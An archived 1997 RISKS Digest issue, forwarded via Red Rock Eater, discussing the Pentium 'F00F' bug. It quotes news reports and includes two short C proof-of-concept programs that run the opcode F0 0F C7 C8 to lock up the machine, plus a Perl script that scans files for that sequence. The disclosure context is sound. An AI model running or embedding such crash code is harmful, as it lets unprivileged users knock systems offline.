---
id: pentium-flaw
title: Pentium flaw
type: writing
writing_type: rre-post
date: 1997-11-11
url: http://commons.somewhere.com:80/rre/1997/Pentium.flaw.html
coauthors: []
key_concepts: []
importance: 5
research_status: partial
tags:
  - auto-imported
  - commerce
  - forwarded-content
  - government-info
  - law
  - libraries
  - military
  - rre
  - rre-post
---




## Source

Automatically imported from: http://commons.somewhere.com:80/rre/1997/Pentium.flaw.html

## Content

|  |  |
| --- | --- |
| [**Red Rock Eater Digest**](https://web.archive.org/web/20001024165717/http://commons.somewhere.com/rre/) | **Most Recent Article: Tue, 24 Oct 2000** |

# Pentium flaw

```
---

This message was forwarded through the Red Rock Eater News Service (RRE).
Send any replies to the original author, listed in the From: field below.
You are welcome to send the message along to others but please do not use
the "redirect" command.  For information on RRE, including instructions
for (un)subscribing, send an empty message to  rre-help@weber.ucsd.edu

---

Date: Tue, 11 Nov 1997 16:51:16 -0800 (PST)
From: risks@csl.sri.com
Subject: RISKS DIGEST 19.45

RISKS-LIST: Risks-Forum Digest  Tuesday 11 November 1997  Volume 19 : Issue 45

---

Date: Tue, 11 Nov 1997 16:39:41 -0500
From: Chuck Weinstock <weinstock@SEI.CMU.EDU>
Subject: New Pentium flaw

To summarize, according to today's *Wall Street Journal*:

The Pentium and Pentium MMX chips apparently can be halted by a single,
unprotected, instruction.  Over 200 million computers with these chips are
expected to be deployed by year-end.  My favorite quote from the article is
by Linley Gwennap, editor of *Microprocessor Report* in Sunnyvale, who says
that "most PC users shouldn't be overly concerned since they would only be
affected if they were the target of a malicious attack."

My second most favorite quote came from Tom Waldrop of Intel in Santa Clara
who "confirmed that someone with malicious intent could exploit the flaw to
cause a system to crash.  But a hacker would have to have an ability to send
programs to a computer in machine code, rather than the conventional
computer languages that most programmers use."  [We all know how hard that
is...actually maybe these days it is, can we count on the fact that few
people know how to write machine code these days?]

Chuck Weinstock

---

Date: 09 Nov 1997 09:26:39 +0100
From: Torsten Hilbrich <Torsten.Hilbrich@bln.de>
Subject: New Pentium flaw

Yesterday (Nov, 8) I found the following information on the news-ticker
page of the German Heise-Verlag (shortened to the essential information):

> The Pentium in standard and MMX version halts on execution of the
> instruction:
>    F0 0F C7 C8
> This code sequence works independent of any memory protection of the
> operating system.

I was able to reproduce this bug on a Pentium 133 system with the following
operating systems: DOS, Windows 95, Linux 2.0.31, and FreeBSD 2.2.x.

I don't know about PentiumPro and Pentium II.

The risk?  Every pentium based server with user access for executing
programs can be crashed using this code sequence.  Not to mention Trojan
Horses or Active-X controls.

Here is an example program:

  unsigned char hang[] = { 0xf0, 0x0f, 0xc7, 0xc8 };

  int main()
  {
    void (*kill)();
    kill = hang;
    kill(); 
    /* return can be omitted as there is none */
  }

More information and example programs for various operating systems
can be found on  http://www.ccc.de

Torsten Hilbrich

  [Also noted by Jeff Anderson-Lee <jonah@EECS.Berkeley.EDU>
  citing an item from Peter Curran in comp.security.unix, 7 Nov 1997.  PGN]

---

Date: Mon, 10 Nov 1997 01:07:34 -0600 (CST)
From: "Steven O. Siegfried" <sos@dial324.skypoint.net>
Subject: New Pentium flaw

New Intel Pentium risk: user mode program locks up system

The following program, when compiled and run in USER mode on any Pentium
(reported as MMX or not, don't know about Pentium II yet) will lock-up the
system.

	> char x [5] = { 0xf0, 0x0f, 0xc7, 0xc8 };
	> main ()
	> {
	>   void (*f)() = x;
	>   f();
	> }

Any user can execute this program at the lowest level of security provided by
the following operating systems: OS/2, NT, W95, Linux.

When I tried it, I could only recover by power-cycling my box.

The following perl script, courtesy of Sam Trenholme via the security
mailing list at Redhat Software is reported to find all occurences of this
code sequence on systems running Linux.  (It found my bomb program after I
used it to kill my system as a test.)  It can probably be adapted for use on
other operating systems.

	> #!/usr/bin/perl 
	> # Source: Sam Trenholme via linux-security@redhat.com mailing list.
	> # There is no known software fix to the F0 0F C7 C8 bug at this time.
	> # usage: $0 dir
	> # Where dir is the directory you recursively look at all programs in
	> # for instances of the F0 0F C7 C8 sequence.
	> # This script will search for programs with this sequence, which will
	> # help sysadmins take appropriate action against those running such
	> # programs.
	> # This script is written (but has not been tested) in Perl4, to
	> # insure maximum compatibility .
	> sub findit {
	>   local($dir,$file,@files,$data) = @_;
	>   undef $/;
	>   if(!opendir(DIR,$dir)) {
	>     print STDERR "Can not open $dir: $!\n";
	>     return 0;
	>     }
	>   @files=readdir(DIR);
	>   foreach $file (@files) {
	>     if($file ne '.' && $file ne '..') {
	>       if( -f "$dir/$file" && open(FILE,"< $dir/$file")) {
	>         $data=<FILE>;
	>         if($data =~ /\xf0\x0f\xc7\xc8/) {
	>           print "$dir/$file contains F0 0F C7 C8\n";
	>           }
	>         } elsif( -d "$dir/$file") {
	>           &findit("$dir/$file");
	>         }
	>       }
	>     }
	>   }
	> $dir = shift || '/home';
	> 
	> &findit($dir);

Basically, there's no protection from this.  Adjust your execution of downline
loaded absolutes accordingly.

Steve Siegfried  sos@skypoint.com sos1@xtl.msc.edu

---

Date: Sat, 8 Nov 1997 12:06:42 -0500 (EST)
From: "Cary B. O'Brien" <cobrien@access.digex.net>
Subject: Recent Pentium opcode bug like Monoclonal Agriculture

  [...] Once again I am reminded of the parallels between nearly complete
market domination by a hardware or software product, and the risks of
monoclonal agriculture (*).

In either case a flaw (be it a hardware error, software bug, or
susceptibility to a strain of bacteria or virus) has the potential to
cripple an entire industry, with serious sociological consequences.  (cf.,
the Irish Potato Famine).

To me, at least, these parallels reinforce the importance of the
government's responsibility to prevent monopolistic activity on the
part of corporations.  Loss of technological diversity is nearly as
bad as the loss of genetic diversity (although far easier to reverse).

Cary O'Brien

(*) By this I mean when a majority of the farms grow genetically
    identical products.

---

End of RISKS-FORUM Digest 19.45 

---

Standard Risks reuse disclaimer:

  Reused without explicit authorization under blanket
  permission granted for all Risks-Forum Digest materials.
  The author(s), the RISKS moderator, and the ACM have no
  connection with this reuse.
```

|  |
| --- |
| **[ProcessTree Network](https://web.archive.org/web/20001024165717/http://www.processtree.com/?sponsor=23069)** TM  For-pay Internet distributed processing. |
| Advertising helps support hosting Red Rock Eater Digest @ The Commons. Advertisers are not associated with the list owner. If you have any comments about the advertising, please direct them to the [Webmaster @ The Commons](https://web.archive.org/web/20001024165717/mailto:webmaster@somewhere.com). |